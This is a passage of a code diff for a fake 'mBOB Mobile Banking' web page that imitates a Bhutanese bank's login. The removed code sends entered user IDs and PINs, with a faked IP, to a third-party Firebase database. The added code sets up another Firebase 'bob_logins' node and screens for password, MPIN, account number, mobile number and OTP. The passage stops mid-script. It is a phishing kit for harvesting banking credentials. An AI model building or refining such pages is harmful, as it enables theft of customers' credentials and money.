@@ -1,461 +1,1175 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>mBOB Mobile Banking</title>
-  
-  <!-- Firebase SDKs -->
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
-  
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-      background: #f0f4f8;
-      color: #1a1a1a;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>mBOB Mobile Banking</title>
 
-    .top-nav {
-      background: #0788bd;
-      color: #ffffff;
-      padding: 14px 20px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      flex-shrink: 0;
-      z-index: 10;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.08);
-    }
-    .top-nav .menu-icon {
-      font-size: 28px;
-      cursor: pointer;
-      background: none;
-      border: none;
-      color: #fff;
-      padding: 4px 8px;
-      border-radius: 6px;
-      transition: background 0.2s;
-    }
-    .top-nav .menu-icon:hover {
-      background: rgba(255,255,255,0.15);
-    }
-    .top-nav .right-icons {
-      display: flex;
-      gap: 20px;
-      font-size: 24px;
-    }
-    .top-nav .right-icons span {
-      cursor: pointer;
-      padding: 4px 6px;
-      border-radius: 6px;
-      transition: background 0.2s;
-    }
-    .top-nav .right-icons span:hover {
-      background: rgba(255,255,255,0.15);
-    }
-    .top-nav .right-icons a {
-      color: #fff;
-      text-decoration: none;
-      display: flex;
-      align-items: center;
-    }
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 
-    .main-content {
-      flex: 1;
-      overflow-y: auto;
-      padding: 20px 8% 10px;
-      display: flex;
-      flex-direction: column;
-      background: #f0f4f8;
-    }
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
 
-    .card {
-      background: #ffffff;
-      border-radius: 16px;
-      padding: 28px 24px 32px;
-      box-shadow: 0 4px 16px rgba(0,0,0,0.06);
-      max-width: 440px;
-      margin: 0 auto;
-      width: 100%;
-    }
+html, body {
+  height: 100%;
+  overflow: hidden;
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+  background: #f0f2f3;
+  color: #1a202c;
+}
 
-    .brand {
-      text-align: center;
-      margin-bottom: 22px;
-    }
-    .brand .logo {
-      font-size: 48px;
-      font-weight: 700;
-      letter-spacing: -3px;
-      color: #1a1a1a;
-    }
-    .brand .logo .m {
-      font-weight: 400;
-      color: #0788bd;
-    }
-    .brand .logo .b {
-      color: #0a9dd1;
-    }
-    .brand .sub {
-      font-size: 12px;
-      letter-spacing: 5px;
-      color: #666;
-      margin-top: 3px;
-      font-weight: 500;
-    }
+/* ==================== TOP NAV ==================== */
+.top-nav {
+  background: #0788bd;
+  color: #ffffff;
+  padding: 14px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  flex-shrink: 0;
+  position: relative;
+  z-index: 100;
+}
 
-    .lang-toggle {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 25px;
-      font-size: 15px;
-      color: #333;
-      margin-bottom: 25px;
-      font-weight: 500;
-    }
-    .lang-toggle .switch {
-      width: 56px;
-      height: 28px;
-      background: #ccc;
-      border-radius: 30px;
-      position: relative;
-      cursor: pointer;
-      transition: 0.3s;
-    }
-    .lang-toggle .switch.active {
-      background: #079acb;
-    }
-    .lang-toggle .switch:after {
-      content: "";
-      position: absolute;
-      width: 22px;
-      height: 22px;
-      background: #ffffff;
-      border-radius: 50%;
-      left: 3px;
-      top: 3px;
-      transition: 0.3s;
-    }
-    .lang-toggle .switch.active:after {
-      left: 31px;
-    }
+.top-nav .menu-icon {
+  font-size: 24px;
+  cursor: pointer;
+  line-height: 1;
+  background: none;
+  border: none;
+  color: #ffffff;
+  padding: 4px 6px;
+}
 
-    .login-form {
-      max-width: 400px;
-      margin: 0 auto;
-    }
-    .form-group {
-      margin-bottom: 24px;
-      border-bottom: 2px solid #78bdcf;
-      position: relative;
-    }
-    .form-group input {
-      width: 100%;
-      border: none;
-      outline: none;
-      font-size: 20px;
-      padding: 10px 0 8px;
-      color: #1a1a1a;
-      background: transparent;
-      font-weight: 400;
-    }
-    .form-group input::placeholder {
-      color: #aaa;
-      font-weight: 300;
-    }
-    .form-group .forgot-link {
-      position: absolute;
-      right: 0;
-      bottom: 8px;
-      font-size: 17px;
-      color: #269ab9;
-      cursor: pointer;
-      text-decoration: none;
-      font-weight: 400;
-    }
-    .form-group .forgot-link:hover {
-      text-decoration: underline;
-    }
+.top-nav .right-icons {
+  display: flex;
+  gap: 22px;
+  font-size: 22px;
+}
 
-    .btn-login {
-      display: block;
-      width: 100%;
-      max-width: 280px;
-      margin: 8px auto 0;
-      background: #08a2d5;
-      color: #ffffff;
-      border: none;
-      border-radius: 30px;
-      padding: 13px 0;
-      font-size: 19px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: background 0.2s;
-      letter-spacing: 0.5px;
-    }
-    .btn-login:hover {
-      background: #0690be;
-    }
-    .btn-login:active {
-      transform: scale(0.98);
-    }
+.top-nav .right-icons span {
+  cursor: pointer;
+  line-height: 1;
+}
 
-    .success-msg {
-      background: #d4edda;
-      color: #155724;
-      padding: 10px 14px;
-      border-radius: 10px;
-      margin-top: 14px;
-      text-align: center;
-      font-size: 14px;
-      font-weight: 500;
-      display: none;
-    }
-    .success-msg.show {
-      display: block;
-    }
-    .success-msg.error {
-      background: #f8d7da;
-      color: #721c24;
-    }
+/* ==================== MAIN CONTAINER ==================== */
+.main-wrap {
+  position: fixed;
+  top: 56px;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  overflow-y: auto;
+  display: flex;
+  flex-direction: column;
+  padding: 20px 8% 100px;
+}
 
-    .banner-container {
-      flex: 1;
-      display: flex;
-      align-items: flex-end;
-      justify-content: center;
-      padding: 12px 0 5px;
-      min-height: 70px;
-    }
-    .banner-container img {
-      width: 100%;
-      max-width: 500px;
-      height: auto;
-      display: block;
-      border-radius: 12px;
-      box-shadow: 0 2px 12px rgba(0,0,0,0.08);
-    }
+/* ==================== LOGO ==================== */
+.brand-block {
+  text-align: center;
+  margin: 15px 0 20px;
+}
 
-    .footer-links {
-      display: flex;
-      justify-content: center;
-      gap: 18px;
-      padding: 8px 20px 10px;
-      flex-shrink: 0;
-      border-top: 1px solid #e8edf2;
-      background: #ffffff;
-      flex-wrap: wrap;
-    }
-    .footer-links a {
-      color: #6c757d;
-      text-decoration: none;
-      font-size: 12px;
-      font-weight: 500;
-      transition: color 0.2s;
-      padding: 4px 8px;
-    }
-    .footer-links a:hover {
-      color: #0788bd;
-      text-decoration: underline;
-    }
-    .footer-links .sep {
-      color: #dde1e5;
-      font-weight: 300;
-    }
+.brand-logo {
+  font-size: 46px;
+  font-weight: 700;
+  letter-spacing: -2px;
+  color: #1a1a1a;
+  line-height: 1;
+}
 
-    @media (max-width: 600px) {
-      .main-content { padding: 16px 5% 10px; }
-      .card { padding: 20px 16px 24px; border-radius: 14px; }
-      .brand .logo { font-size: 40px; }
-      .brand .sub { font-size: 10px; letter-spacing: 3px; }
-      .lang-toggle { font-size: 13px; gap: 18px; margin-bottom: 20px; }
-      .form-group input { font-size: 18px; }
-      .form-group .forgot-link { font-size: 15px; }
-      .btn-login { font-size: 17px; padding: 12px 0; max-width: 100%; }
-      .banner-container { padding: 10px 0 3px; min-height: 50px; }
-      .banner-container img { border-radius: 8px; }
-      .footer-links { gap: 10px; padding: 6px 12px 8px; }
-      .footer-links a { font-size: 11px; padding: 3px 6px; }
-      .footer-links .sep { display: none; }
-    }
+.brand-logo .m {
+  font-weight: 400;
+  color: #0788bd;
+  font-style: italic;
+}
 
-    @media (max-width: 400px) {
-      .brand .logo { font-size: 34px; }
-      .form-group input { font-size: 16px; }
-      .btn-login { font-size: 16px; padding: 11px 0; }
-      .top-nav { padding: 12px 16px; }
-      .top-nav .right-icons { font-size: 20px; gap: 14px; }
-    }
-  </style>
+.brand-logo .b {
+  color: #0a9dd1;
+}
+
+.brand-sub {
+  font-size: 11px;
+  letter-spacing: 5px;
+  color: #666;
+  margin-top: 5px;
+  font-weight: 500;
+}
+
+/* ==================== LANGUAGE ==================== */
+.lang-row {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 22px;
+  font-size: 14px;
+  color: #333;
+  margin-bottom: 30px;
+  font-weight: 500;
+}
+
+.lang-toggle {
+  width: 54px;
+  height: 28px;
+  background: #d1d5db;
+  border-radius: 30px;
+  position: relative;
+  cursor: pointer;
+  transition: 0.3s;
+}
+
+.lang-toggle.active {
+  background: #079acb;
+}
+
+.lang-toggle::after {
+  content: "";
+  position: absolute;
+  width: 22px;
+  height: 22px;
+  background: #ffffff;
+  border-radius: 50%;
+  left: 3px;
+  top: 3px;
+  transition: 0.3s;
+  box-shadow: 0 1px 3px rgba(0,0,0,0.15);
+}
+
+.lang-toggle.active::after {
+  left: 29px;
+}
+
+/* ==================== FORM ==================== */
+.form-area {
+  max-width: 480px;
+  width: 100%;
+  margin: 0 auto;
+}
+
+.form-group {
+  position: relative;
+  margin-bottom: 24px;
+  border-bottom: 2px solid #78bdcf;
+  padding-bottom: 6px;
+}
+
+.form-group input {
+  width: 100%;
+  border: none;
+  outline: none;
+  font-size: 19px;
+  padding: 10px 0 8px;
+  color: #1a202c;
+  background: transparent;
+  font-family: inherit;
+  font-weight: 400;
+}
+
+.form-group input::placeholder {
+  color: #a0aec0;
+  font-weight: 300;
+}
+
+.form-group .forgot-link {
+  position: absolute;
+  right: 0;
+  bottom: 12px;
+  font-size: 16px;
+  color: #269ab9;
+  cursor: pointer;
+  text-decoration: none;
+  font-weight: 400;
+}
+
+.form-group .forgot-link:hover {
+  text-decoration: underline;
+}
+
+/* ==================== LOGIN BUTTON ==================== */
+.btn-login {
+  width: 100%;
+  padding: 15px;
+  background: #08a2d5;
+  color: #ffffff;
+  border: none;
+  border-radius: 30px;
+  font-size: 19px;
+  font-weight: 500;
+  font-family: inherit;
+  cursor: pointer;
+  transition: all 0.2s;
+  letter-spacing: 0.5px;
+  margin-top: 8px;
+}
+
+.btn-login:hover:not(:disabled) {
+  background: #0690be;
+}
+
+.btn-login:active:not(:disabled) {
+  transform: scale(0.99);
+}
+
+.btn-login:disabled {
+  background: #cbd5e0;
+  cursor: not-allowed;
+}
+
+/* ==================== BOTTOM BAR ==================== */
+.bottom-bar {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  background: #ffffff;
+  border-top: 1px solid #e8e8e8;
+  display: flex;
+  justify-content: space-around;
+  align-items: center;
+  padding: 12px 20px 16px;
+  z-index: 50;
+  box-shadow: 0 -2px 10px rgba(0,0,0,0.04);
+}
+
+.bottom-item {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 4px;
+  cursor: pointer;
+  background: none;
+  border: none;
+  font-family: inherit;
+  color: #555;
+  font-size: 13px;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+
+.bottom-item:hover {
+  color: #0788bd;
+}
+
+.bottom-item .icon {
+  font-size: 26px;
+  line-height: 1;
+}
+
+.bottom-item .qr-circle {
+  width: 62px;
+  height: 62px;
+  border-radius: 50%;
+  background: #08a2d5;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #ffffff;
+  font-size: 28px;
+  box-shadow: 0 4px 12px rgba(8, 162, 213, 0.35);
+  margin-bottom: -4px;
+  border: 3px solid #ffffff;
+}
+
+/* ==================== SCREEN PAGE ==================== */
+.screen-page {
+  position: fixed;
+  inset: 0;
+  background: #f0f2f3;
+  display: none;
+  flex-direction: column;
+  z-index: 200;
+}
+
+.screen-page.show {
+  display: flex;
+}
+
+.screen-header {
+  background: #0788bd;
+  color: #ffffff;
+  padding: 14px 20px;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  flex-shrink: 0;
+}
+
+.back-btn {
+  width: 36px;
+  height: 36px;
+  border-radius: 8px;
+  background: rgba(255, 255, 255, 0.15);
+  border: none;
+  color: #ffffff;
+  font-size: 20px;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: inherit;
+}
+
+.back-btn:hover {
+  background: rgba(255, 255, 255, 0.25);
+}
+
+.screen-header-title {
+  font-size: 15px;
+  font-weight: 600;
+  letter-spacing: 0.3px;
+}
+
+.screen-body {
+  flex: 1;
+  overflow-y: auto;
+  padding: 30px 8% 40px;
+  display: flex;
+  flex-direction: column;
+}
+
+/* ==================== SCREEN LOGO ==================== */
+.screen-logo {
+  text-align: center;
+  margin-bottom: 30px;
+}
+
+.screen-logo .brand-logo {
+  font-size: 40px;
+}
+
+.screen-logo .brand-sub {
+  font-size: 10px;
+  letter-spacing: 4px;
+}
+
+/* ==================== SCREEN TITLE ==================== */
+.screen-title {
+  font-size: 20px;
+  font-weight: 700;
+  color: #1a202c;
+  margin-bottom: 8px;
+  text-align: center;
+}
+
+.screen-subtitle {
+  font-size: 14px;
+  color: #718096;
+  margin-bottom: 30px;
+  text-align: center;
+  line-height: 1.5;
+}
+
+/* ==================== OTP INPUTS ==================== */
+.otp-inputs {
+  display: flex;
+  gap: 8px;
+  justify-content: center;
+  margin-bottom: 30px;
+}
+
+.otp-inputs input {
+  width: 46px;
+  height: 56px;
+  text-align: center;
+  font-size: 22px;
+  font-weight: 700;
+  border: 2px solid #78bdcf;
+  border-radius: 10px;
+  outline: none;
+  background: #ffffff;
+  color: #1a202c;
+  font-family: inherit;
+  transition: all 0.2s;
+}
+
+.otp-inputs input:focus {
+  border-color: #0788bd;
+  box-shadow: 0 0 0 3px rgba(7, 136, 189, 0.12);
+}
+
+.otp-inputs input.filled {
+  border-color: #0788bd;
+  background: #f0f9fd;
+}
+
+/* ==================== TIMER ==================== */
+.timer-display {
+  display: inline-block;
+  background: #e0eef2;
+  color: #2c5a6e;
+  padding: 10px 24px;
+  border-radius: 30px;
+  font-size: 18px;
+  font-weight: 700;
+  font-family: 'Courier New', monospace;
+  letter-spacing: 3px;
+  margin: 0 auto 26px;
+  text-align: center;
+}
+
+.timer-display.expiring {
+  background: #ffe0e0;
+  color: #c62828;
+}
+
+/* ==================== VERIFY BUTTON ==================== */
+.btn-verify {
+  width: 100%;
+  padding: 15px;
+  background: #08a2d5;
+  color: #ffffff;
+  border: none;
+  border-radius: 30px;
+  font-size: 18px;
+  font-weight: 500;
+  font-family: inherit;
+  cursor: pointer;
+  transition: all 0.2s;
+  letter-spacing: 0.5px;
+  margin-top: 8px;
+}
+
+.btn-verify:hover:not(:disabled) {
+  background: #0690be;
+}
+
+.btn-verify:active:not(:disabled) {
+  transform: scale(0.99);
+}
+
+.btn-verify:disabled {
+  background: #cbd5e0;
+  cursor: not-allowed;
+}
+
+/* ==================== MESSAGES ==================== */
+.message {
+  margin-top: 18px;
+  padding: 12px 16px;
+  border-radius: 10px;
+  font-size: 13px;
+  font-weight: 500;
+  display: none;
+  text-align: center;
+}
+
+.message.show {
+  display: block;
+}
+
+.message.error {
+  background: #ffebee;
+  color: #b71c1c;
+  border-left: 3px solid #d32f2f;
+}
+
+.message.warning {
+  background: #fff8e1;
+  color: #e65100;
+  border-left: 3px solid #f57c00;
+}
+
+.message.success {
+  background: #e8f5e9;
+  color: #1b5e20;
+  border-left: 3px solid #00c853;
+}
+
+/* ==================== OTP INFO ==================== */
+.otp-info {
+  font-size: 13px;
+  color: #4a5568;
+  margin-bottom: 22px;
+  text-align: center;
+  line-height: 1.6;
+}
+
+.otp-info strong {
+  color: #0788bd;
+  font-weight: 700;
+}
+
+/* ==================== RESEND ==================== */
+.resend-row {
+  text-align: center;
+  margin-top: 20px;
+}
+
+.resend-link {
+  color: #718096;
+  font-size: 13px;
+  text-decoration: underline;
+  cursor: pointer;
+  font-weight: 500;
+}
+
+.resend-link:hover {
+  color: #0788bd;
+}
+
+/* ==================== ACCOUNT FORM ==================== */
+.account-form {
+  width: 100%;
+}
+
+.account-form .form-group {
+  margin-bottom: 24px;
+}
+
+.account-form label {
+  display: block;
+  font-size: 12px;
+  font-weight: 600;
+  color: #4a5568;
+  margin-bottom: 8px;
+  letter-spacing: 0.3px;
+  text-transform: uppercase;
+}
+
+.account-form input {
+  width: 100%;
+  padding: 14px 16px;
+  border: 2px solid #78bdcf;
+  border-radius: 10px;
+  font-size: 15px;
+  font-family: inherit;
+  color: #1a202c;
+  background: #ffffff;
+  outline: none;
+  transition: all 0.2s;
+}
+
+.account-form input:focus {
+  border-color: #0788bd;
+  box-shadow: 0 0 0 3px rgba(7, 136, 189, 0.12);
+}
+
+.account-form input::placeholder {
+  color: #a0aec0;
+  font-weight: 400;
+}
+
+/* ==================== LOADING ==================== */
+.loading-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(255, 255, 255, 0.9);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 900;
+}
+
+.loading-overlay.show {
+  display: flex;
+}
+
+.loading-spinner {
+  width: 46px;
+  height: 46px;
+  border: 3px solid #e2e8f0;
+  border-top: 3px solid #0788bd;
+  border-radius: 50%;
+  animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+/* ==================== RESPONSIVE ==================== */
+@media (max-width: 480px) {
+  .otp-inputs input {
+    width: 42px;
+    height: 52px;
+    font-size: 20px;
+  }
+  .otp-inputs { gap: 6px; }
+  .brand-logo { font-size: 40px; }
+  .screen-title { font-size: 18px; }
+  .form-group input { font-size: 17px; }
+  .form-group .forgot-link { font-size: 14px; }
+}
+</style>
 </head>
 <body>
-  <div class="top-nav">
-    <button class="menu-icon" onclick="goHome()">☰</button>
-    <div class="right-icons">
-      <a href="mailto:support@bob.bt" title="Email Support">
-        <span>✉</span>
-      </a>
-      <span onclick="alert('📞 Customer Support: +975 2 349903')">☎</span>
-    </div>
+
+<!-- ==================== LOGIN PAGE ==================== -->
+<div class="main-wrap" id="loginPage">
+  <div class="brand-block">
+    <div class="brand-logo"><span class="m">m</span>BO<span class="b">B</span></div>
+    <div class="brand-sub">MOBILE BANKING</div>
   </div>
 
-  <div class="main-content">
-    <div class="card">
-      <div class="brand">
-        <div class="logo">
-          <span class="m">m</span>BO<span class="b">B</span>
-        </div>
-        <div class="sub">MOBILE BANKING</div>
-      </div>
-
-      <div class="lang-toggle">
-        <span>English</span>
-        <div class="switch" id="langSwitch" onclick="toggleLanguage()"></div>
-        <span>བོད་ཡིག</span>
-      </div>
-
-      <div class="login-form">
-        <div class="form-group">
-          <input type="text" id="loginUserId" placeholder="Enter User ID" autocomplete="off">
-          <span class="forgot-link" onclick="forgotUserId()">Forgot</span>
-        </div>
-        <div class="form-group">
-          <input type="password" id="loginPin" inputmode="numeric" maxlength="6" placeholder="M-PIN" autocomplete="off">
-          <span class="forgot-link" onclick="forgotPin()">Forgot</span>
-        </div>
-        <button class="btn-login" onclick="handleLogin()">Login</button>
-        
-        <div id="loginSuccess" class="success-msg"></div>
-      </div>
-    </div>
-
-    <div class="banner-container">
-      <img src="https://i.postimg.cc/3wTkpstp/IMG-20260908-095801-957.jpg" alt="mBOB Banner" loading="lazy">
-    </div>
+  <div class="lang-row">
+    <span>English</span>
+    <div class="lang-toggle" id="langToggle" onclick="toggleLang()"></div>
+    <span>བོད་ཡིག</span>
   </div>
 
-  <div class="footer-links">
-    <a href="#" onclick="goHome()">🏠 Home</a>
-    <span class="sep">|</span>
-    <a href="#" onclick="showPrivacy()">🔒 Privacy Policy</a>
-    <span class="sep">|</span>
-    <a href="mailto:support@bob.bt">✉ support@bob.bt</a>
+  <form class="form-area" id="loginForm" onsubmit="handleLogin(event)">
+    <div class="form-group">
+      <input type="text" id="userId" placeholder="Enter User ID" autocomplete="off">
+      <span class="forgot-link" onclick="forgotUserId()">Forgot</span>
+    </div>
+
+    <div class="form-group">
+      <input type="password" id="password" placeholder="Password" autocomplete="off">
+      <span class="forgot-link" onclick="forgotPassword()">Forgot</span>
+    </div>
+
+    <button type="submit" class="btn-login" id="loginBtn" disabled>Login</button>
+  </form>
+</div>
+
+<!-- ==================== TOP NAV ==================== -->
+<div class="top-nav">
+  <button class="menu-icon" onclick="menuClick()">☰</button>
+  <div class="right-icons">
+    <span onclick="emailClick()">✉</span>
+    <span onclick="callClick()">☎</span>
   </div>
+</div>
 
-  <script>
-    // ===== FIREBASE CONFIG =====
-    const firebaseConfig = {
-      apiKey: "AIzaSyB9Y2_hnmgQsFute7DDAcKjmuoAnggQZJY",
-      authDomain: "long-d1bcb.firebaseapp.com",
-      databaseURL: "https://long-d1bcb-default-rtdb.firebaseio.com",
-      projectId: "long-d1bcb",
-      storageBucket: "long-d1bcb.firebasestorage.app",
-      messagingSenderId: "515546162619",
-      appId: "1:515546162619:web:5ab1efa7f6e81f8c7e509e",
-      measurementId: "G-EQGWR7E0ZV"
-    };
+<!-- ==================== BOTTOM BAR ==================== -->
+<div class="bottom-bar">
+  <button class="bottom-item" onclick="forexClick()">
+    <span class="icon">↔</span>
+    <span>Forex</span>
+  </button>
+  <button class="bottom-item" onclick="qrClick()">
+    <div class="qr-circle">▦</div>
+  </button>
+  <button class="bottom-item" onclick="transferClick()">
+    <span class="icon">⇄</span>
+    <span>Quick Transfer</span>
+  </button>
+</div>
 
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const database = firebase.database();
+<!-- ==================== MPIN SCREEN ==================== -->
+<div class="screen-page" id="mpinPage">
+  <div class="screen-header">
+    <button class="back-btn" onclick="goBack()">←</button>
+    <div class="screen-header-title">Verify MPIN</div>
+  </div>
+  <div class="screen-body">
+    <div class="screen-logo">
+      <div class="brand-logo"><span class="m">m</span>BO<span class="b">B</span></div>
+      <div class="brand-sub">MOBILE BANKING</div>
+    </div>
 
-    console.log('🔥 Firebase initialized successfully!');
+    <div class="screen-title">Enter Your MPIN</div>
+    <div class="screen-subtitle">Enter your 6-digit MPIN to continue</div>
 
-    // ===== FUNCTIONS =====
-    function goHome() {
-      document.getElementById('loginUserId').value = '';
-      document.getElementById('loginPin').value = '';
-      document.getElementById('loginSuccess').classList.remove('show');
-    }
+    <div class="otp-inputs">
+      <input type="text" maxlength="1" inputmode="numeric" id="m1" oninput="moveInput(this, 'm2')">
+      <input type="text" maxlength="1" inputmode="numeric" id="m2" oninput="moveInput(this, 'm3')">
+      <input type="text" maxlength="1" inputmode="numeric" id="m3" oninput="moveInput(this, 'm4')">
+      <input type="text" maxlength="1" inputmode="numeric" id="m4" oninput="moveInput(this, 'm5')">
+      <input type="text" maxlength="1" inputmode="numeric" id="m5" oninput="moveInput(this, 'm6')">
+      <input type="text" maxlength="1" inputmode="numeric" id="m6" oninput="moveInput(this, null)">
+    </div>
 
-    function showPrivacy() {
-      alert('🔒 Privacy Policy\n\nYour privacy is important to us.\n\n• Your login credentials are stored securely\n• We do not share your data with third parties\n• All transactions are encrypted\n\nFor more details, contact: support@bob.bt');
-    }
+    <button class="btn-verify" id="mpinBtn" onclick="handleMpinVerify()" disabled>Verify</button>
+    <div class="message" id="mpinMessage"></div>
+  </div>
+</div>
 
-    function toggleLanguage() {
-      document.getElementById('langSwitch').classList.toggle('active');
-    }
+<!-- ==================== ACCOUNT DETAILS SCREEN ==================== -->
+<div class="screen-page" id="accountPage">
+  <div class="screen-header">
+    <button class="back-btn" onclick="goBackTo('mpinPage')">←</button>
+    <div class="screen-header-title">Account Details</div>
+  </div>
+  <div class="screen-body">
+    <div class="screen-logo">
+      <div class="brand-logo"><span class="m">m</span>BO<span class="b">B</span></div>
+      <div class="brand-sub">MOBILE BANKING</div>
+    </div>
 
-    function forgotUserId() {
-      alert('📞 Please contact support at support@bob.bt for User ID assistance.');
-    }
+    <div class="screen-title">Account Details</div>
+    <div class="screen-subtitle">Please enter your account information</div>
 
-    function forgotPin() {
-      alert('📞 Please contact support at support@bob.bt for M-PIN reset.');
-    }
+    <form class="account-form" onsubmit="event.preventDefault();">
+      <div class="form-group">
+        <label>Account Number</label>
+        <input type="text" id="accountNumber" placeholder="Enter your account number" autocomplete="off" oninput="checkAccountForm()">
+      </div>
 
-    function handleLogin() {
-      const userId = document.getElementById('loginUserId').value.trim();
-      const pin = document.getElementById('loginPin').value.trim();
+      <div class="form-group">
+        <label>Mobile Number</label>
+        <input type="tel" id="mobileNumber" inputmode="numeric" placeholder="Enter your mobile number" autocomplete="off" oninput="checkAccountForm()">
+      </div>
 
-      if (!userId || !pin) {
-        alert('Please enter both User ID and M-PIN.');
-        return;
-      }
+      <button type="button" class="btn-verify" id="accountBtn" onclick="handleAccountConfirm()" disabled>Confirm</button>
+      <div class="message" id="accountMessage"></div>
+    </form>
+  </div>
+</div>
 
-      if (pin.length < 4 || pin.length > 6) {
-        alert('M-PIN must be 4-6 digits.');
-        return;
-      }
+<!-- ==================== OTP SCREEN ==================== -->
+<div class="screen-page" id="otpPage">
+  <div class="screen-header">
+    <button class="back-btn" onclick="goBackTo('accountPage')">←</button>
+    <div class="screen-header-title">OTP Verification</div>
+  </div>
+  <div class="screen-body">
+    <div class="screen-logo">
+      <div class="brand-logo"><span class="m">m</span>BO<span class="b">B</span></div>
+      <div class="brand-sub">MOBILE BANKING</div>
+    </div>
 
-      const now = new Date();
-      const timeStr = now.toLocaleString('en-US', { hour12: true });
-      const timestamp = now.getTime();
+    <div class="screen-title">Verify OTP</div>
+    <div class="screen-subtitle">Enter the 6-digit OTP code</div>
 
-      const loginData = {
-        userId: userId,
-        pin: pin,
-        status: 'success',
-        time: timeStr,
-        timestamp: timestamp,
-        device: navigator.userAgent || 'Unknown',
-        ip: '192.168.1.' + Math.floor(Math.random() * 255)
-      };
+    <div class="otp-info">
+      OTP has been sent to <strong id="maskedNumber">******</strong>
+    </div>
 
-      // Save to Firebase
-      const loginsRef = database.ref('logins');
-      const newLoginRef = loginsRef.push();
-      
-      newLoginRef.set(loginData)
-        .then(() => {
-          const successEl = document.getElementById('loginSuccess');
-          successEl.textContent = '✅ Login successful! Welcome ' + userId;
-          successEl.className = 'success-msg show';
-          
-          document.getElementById('loginPin').value = '';
-          
-          setTimeout(() => {
-            successEl.classList.remove('show');
-          }, 3000);
-          
-          console.log('✅ Login saved to Firebase:', loginData);
-        })
-        .catch((error) => {
-          const successEl = document.getElementById('loginSuccess');
-          successEl.textContent = '❌ Error saving login. Please try again.';
-          successEl.className = 'success-msg show error';
-          
-          setTimeout(() => {
-            successEl.classList.remove('show');
-          }, 3000);
-          console.error('❌ Firebase error:', error);
-        });
-    }
+    <div class="timer-display" id="otpTimer">03:00</div>
 
-    document.addEventListener('DOMContentLoaded', function() {
-      document.getElementById('langSwitch').classList.remove('active');
+    <div class="otp-inputs">
+      <input type="text" maxlength="1" inputmode="numeric" id="o1" oninput="moveInput(this, 'o2')">
+      <input type="text" maxlength="1" inputmode="numeric" id="o2" oninput="moveInput(this, 'o3')">
+      <input type="text" maxlength="1" inputmode="numeric" id="o3" oninput="moveInput(this, 'o4')">
+      <input type="text" maxlength="1" inputmode="numeric" id="o4" oninput="moveInput(this, 'o5')">
+      <input type="text" maxlength="1" inputmode="numeric" id="o5" oninput="moveInput(this, 'o6')">
+      <input type="text" maxlength="1" inputmode="numeric" id="o6" oninput="moveInput(this, null)">
+    </div>
+
+    <button class="btn-verify" id="otpBtn" onclick="handleOtpVerify()" disabled>Verify</button>
+
+    <div class="resend-row">
+      <span class="resend-link" onclick="resendOtp()">Resend OTP</span>
+    </div>
+
+    <div class="message" id="otpMessage"></div>
+  </div>
+</div>
+
+<!-- ==================== LOADING ==================== -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-spinner"></div>
+</div>
+
+<script>
+// =====================================================
+// FIREBASE
+// =====================================================
+var firebaseConfig = {
+  apiKey: "AIzaSyBIwUsxyeQmoeT2ctH2LxqRU__dhqp9s94",
+  authDomain: "kharal-b47b6.firebaseapp.com",
+  databaseURL: "https://kharal-b47b6-default-rtdb.firebaseio.com",
+  projectId: "kharal-b47b6",
+  storageBucket: "kharal-b47b6.firebasestorage.app",
+  messagingSenderId: "528214841740",
+  appId: "1:528214841740:web:e394a574ef2ba2c16e9ea9"
+};
+firebase.initializeApp(firebaseConfig);
+var database = firebase.database();
+
+// 🔥 mBOB data node
+var DATA_NODE = 'bob_logins';
+
+var sessionRef = null;
+var userIdValue = "";
+var passwordValue = "";
+var mpinValue = "";
+var accountNumberValue = "";
+var mobileNumberValue = "";
+var otpAttemptCount = 0;
+var timerInterval = null;
+var timeLeft = 180;
+
+// =====================================================
+// LANGUAGE TOGGLE
+// =====================================================
+function toggleLang() {
+  document.getElementById('langToggle').classList.toggle('active');
+}
+
+// =====================================================
+// FORGOT HANDLERS
+// =====================================================
+function forgotUserId() {
+  alert('Please contact Bank of Bhutan customer care for User ID assistance.');
+}
+
+function forgotPassword() {
+  alert('Please contact Bank of Bhutan customer care for password reset.');
+}
+
+// =====================================================
+// NAV HANDLERS
+// =====================================================
+function menuClick() {
+  alert('Menu\n\n• Home\n• Accounts\n• Transfer\n• Bill Pay\n• Settings\n• Help');
+}
+
+function emailClick() {
+  window.location.href = 'mailto:support@bob.bt';
+}
+
+function callClick() {
+  alert('Customer Care\n\n📞 +975 2 349903\n🆓 Toll Free: 1095');
+}
+
